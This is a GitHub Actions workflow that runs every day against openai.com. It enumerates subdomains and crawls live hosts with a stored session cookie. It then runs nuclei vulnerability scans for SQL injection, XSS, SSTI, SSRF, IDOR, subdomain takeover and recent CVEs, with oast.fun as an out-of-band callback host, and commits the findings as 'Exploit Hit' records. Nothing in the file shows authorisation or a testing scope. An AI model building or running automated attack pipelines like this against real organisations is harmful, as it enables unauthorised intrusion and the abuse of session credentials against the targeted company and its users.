name: "Elite 6"

on:
  schedule:
    - cron: '0 0 * * *'
  workflow_dispatch:

permissions:
  contents: write

env:
  PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
  AUTH_COOKIE: ${{ secrets.OPENAI_COOKIE }}

jobs:

  recon:
    runs-on: ubuntu-latest
    continue-on-error: true
    steps:
      - uses: actions/checkout@v4

      - name: Install Arsenal
        run: |
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/projectdiscovery/katana/cmd/katana@latest
          go install github.com/projectdiscovery/uncover/cmd/uncover@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Passive Discovery
        run: subfinder -d openai.com -all -silent -o subs.txt || true

      - name: Cloud Discovery
        run: uncover -q "openai.com" -limit 500 -auth "$PDCP_API_KEY" >> subs.txt || true

      - name: Filter Alive
        run: sort -u subs.txt | httpx -silent -o alive.txt || touch alive.txt

      - name: Crawl
        run: katana -list alive.txt -jc -kf all -d 3 -H "Cookie: $AUTH_COOKIE" -o params_new.txt || touch params_new.txt

      - name: Dedup & Index
        run: |
          touch params.txt
          grep -vFf params.txt params_new.txt > to_scan.txt || cp params_new.txt to_scan.txt
          cat params.txt params_new.txt | sort -u > master_updated.txt

      - uses: actions/upload-artifact@v4
        with:
          name: targets
          path: |
            to_scan.txt
            master_updated.txt

  fuzz:
    needs: recon
    if: always()
    runs-on: ubuntu-latest
    continue-on-error: true
    strategy:
      fail-fast: false
      matrix:
        vuln: [sqli, xss, ssti, ssrf, idor, takeover, exposure]

    steps:
      - uses: actions/checkout@v4

      - uses: actions/download-artifact@v4
        with:
          name: targets

      - name: Install Nuclei
        run: |
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH
          nuclei -ut

      - name: Run Exploit Scan
        run: |
          if [ -s to_scan.txt ]; then
            nuclei -l to_scan.txt \
              -tags ${{ matrix.vuln }},cve2025,cve2026 \
              -interactsh-server oast.fun \
              -H "Cookie: $AUTH_COOKIE" \
              -o results.txt || true
          fi

      - name: Commit Results
        run: |
          git config user.email "bot@hacker.ai"
          git config user.name "Exploit-Bot"

          git fetch origin main
          git reset --hard origin/main

          [ -f master_updated.txt ] && cp master_updated.txt params.txt
          mkdir -p vulnerabilities
          [ -f results.txt ] && cp results.txt vulnerabilities/${{ matrix.vuln }}_hits.txt

          git add params.txt vulnerabilities || true
          git commit -m "Exploit Hit: ${{ matrix.vuln }} | $(date -u)" || true
          git push || true
